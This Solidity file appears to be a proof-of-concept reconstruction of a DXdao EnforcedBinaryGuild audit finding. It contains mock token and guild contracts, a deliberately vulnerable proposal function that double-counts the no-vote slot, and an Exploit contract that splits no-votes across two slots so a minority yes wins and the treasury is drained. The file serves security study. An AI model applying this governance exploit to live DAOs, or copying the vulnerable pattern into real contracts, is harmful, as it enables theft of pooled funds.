// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  DXdao — EnforcedBinaryGuild (Sigma Prime)
    The child adds one totalActions for the enforced no-vote. BaseERC20Guild
    adds another because action 0 is already the no-vote. No votes split across
    the two no-action slots (40 and 40) lose to a 50-vote yes, and the guild
    sends its 100e18 treasury to the proposer.
*/

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }
}

contract GuildToken {
    string public symbol = "DXD";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract BaseERC20Guild {
    using SafeMath for uint256;

    struct Proposal {
        address to;
        bytes data;
        uint256[] totalVotes;
        bool executed;
    }

    GuildToken public token;
    uint256 public nextId;
    mapping(uint256 => Proposal) internal proposals;

    constructor(GuildToken token_) {
        token = token_;
    }

    function createProposal(address to, bytes memory data, uint256 totalActions) external returns (uint256 id) {
        Proposal storage p = proposals[nextId];
        p.to = to;
        p.data = data;
        p.totalVotes = new uint256[](totalActions.add(1)); // STORY: parent slot
        id = nextId;
        nextId += 1;
    }

    function vote(uint256 id, uint256 action, uint256 weight) external {
        proposals[id].totalVotes[action] += weight;
    }

    function voteOf(uint256 id, uint256 action) external view returns (uint256) {
        return proposals[id].totalVotes[action];
    }

    function votesLength(uint256 id) external view returns (uint256) {
        return proposals[id].totalVotes.length;
    }

    function executed(uint256 id) external view returns (bool) {
        return proposals[id].executed;
    }

    function endProposal(uint256 id) external {
        Proposal storage p = proposals[id];
        uint256 best = 0;
        for (uint256 i = 1; i < p.totalVotes.length; i++) {
            if (p.totalVotes[i] > p.totalVotes[best]) best = i; // STORY: argmax
        }
        require(best != 0 && best != p.totalVotes.length - 1, "rejected");
        (bool ok,) = p.to.call(p.data); // STORY: execute
        require(ok, "call");
        p.executed = true;
    }
}

contract EnforcedBinaryGuild {
    using SafeMath for uint256;

    BaseERC20Guild public base;

    constructor(BaseERC20Guild base_) {
        base = base_;
    }

    function createProposal(address to, bytes memory data) external returns (uint256) {
        uint256 totalActions = data.length > 0 ? 1 : 0;
        totalActions = totalActions.add(1); // @> VULN: child adds a no-action the parent already adds
        return base.createProposal(to, data, totalActions);
    }

    function createProposalFixed(address to, bytes memory data) external returns (uint256) {
        return base.createProposal(to, data, 1);
    }
}

contract Exploit {
    GuildToken public token;
    BaseERC20Guild public base;
    EnforcedBinaryGuild public guild;
    uint256 public proposalId;
    uint256 public drained;

    constructor() {
        token = new GuildToken();
        base = new BaseERC20Guild(token);
        guild = new EnforcedBinaryGuild(base);
        token.mint(address(base), 100e18);
    }

    function run() external {
        bytes memory data = abi.encodeWithSignature("transfer(address,uint256)", address(this), uint256(100e18));
        proposalId = guild.createProposal(address(token), data); // STORY: create
        require(base.votesLength(proposalId) == 3, "slots");
        base.vote(proposalId, 0, 40e18); // STORY: no A
        base.vote(proposalId, 1, 50e18);
        base.vote(proposalId, 2, 40e18); // STORY: no B
        base.endProposal(proposalId);
        drained = token.balanceOf(address(this));
        require(base.executed(proposalId), "exec");
        require(drained == 100e18, "drain"); // STORY: harm
        require(token.balanceOf(address(base)) == 0, "left");
    }
}
